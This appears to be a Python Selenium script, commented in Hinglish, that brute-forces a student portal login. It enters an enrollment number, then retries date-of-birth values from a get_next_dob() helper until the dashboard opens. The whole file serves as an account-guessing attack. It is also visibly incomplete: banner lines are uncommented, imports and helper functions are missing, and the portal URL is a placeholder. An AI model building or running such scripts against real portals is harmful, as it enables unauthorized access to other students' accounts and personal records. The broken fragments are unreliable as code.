 =========================================================================
                              CONFIGURATION
 =========================================================================
portal_url = "http://😕 apni file ka name liikh dekh kiya rha he "
local_html_file = f"file://{os.path.abspath('index.html')}"

enrollment_no = input("Apna Enrollment Number daalein (Optional): ").strip()
dob = input("Apna DOB daalein: ").strip()

options = webdriver.ChromeOptions()
options.add_argument("--start-maximized")
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

def check_login_status(driver, timeout=1.5):
    """Super fast check: 0.05s intervals me check karega"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        # 1. Alert check (Galat DOB par turant pakad lega)
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            return False, alert_text
        except Exception:
            pass

        # 2. Dashboard open hone par
        if "dashboard" in driver.current_url.lower():
            return True, "Dashboard detected"

        time.sleep(0.05)

    return False, "Timeout"

try:
    print(f"\nWebsite open ho rahi hai: {portal_url}")
    try:
        driver.get(portal_url)
    except Exception:
        driver.get(local_html_file)

    wait = WebDriverWait(driver, 5)

     -------------------------------------------------------------
       ONE-TIME SETUP (Inhe lagane par kabhi error nahi aayega)
     -------------------------------------------------------------
    # 1. Student select karna ho:
    click_student(driver)

    # 2. Popup me YES dabana ho:
    click_yes(driver)

    # 3. Popup me NO / OK / CANCEL dabana ho toh bas un-comment karein:
    # click_no(driver)
    # click_ok(driver)
    # click_cancel(driver)
    # click_next(driver)

    # 4. Enrollment Number Fill (Agar page par ho toh):
    try:
        enroll_input = driver.find_element(
            By.XPATH, "//input[contains(@id, 'txtEnrollment') or contains(@placeholder, 'Enrollment')][1]"
        )
        enroll_input.clear()
        enroll_input.send_keys(enrollment_no)
    except Exception:
        pass

    # 5. DOB field locate karna:
    dob_field = wait.until(EC.visibility_of_element_located((
        By.XPATH, "//input[contains(@id, 'txtDOB') or @type='password' or @type='text'][1]"
    )))

     -------------------------------------------------------------
                       LIGHTNING FAST RETRY LOOP
     -------------------------------------------------------------
    while True:
        # Fast Clear & Enter DOB
        dob_field.send_keys(Keys.COMMAND + "a")
        dob_field.send_keys(Keys.CONTROL + "a")
        dob_field.send_keys(Keys.BACKSPACE)
        dob_field.send_keys(dob)

        # Login button click (Helper function se)
        click_login(driver)

        # Fast Status Check
        is_success, msg = check_login_status(driver)
        if is_success:
            print("\n" + "=" * 50)
            print(f"🎉 SUCCESS! Sahi DOB mila ({dob}), Login ho gaya!")
            print("=" * 50)
            break
        else:
            print(f"❌ Galat DOB: {dob}")
            RETRY_DOB = get_next_dob()
            if not RETRY_DOB:
                print("Khatam: get_next_dob() ne koi DOB nahi diya.")
                break
            dob = str(RETRY_DOB).strip()

except Exception as e:
    print(f"\nError: {e}")

finally:
    print("\nBrowser band karne ke liye Enter dabayein...")
    input()
    driver.quit()
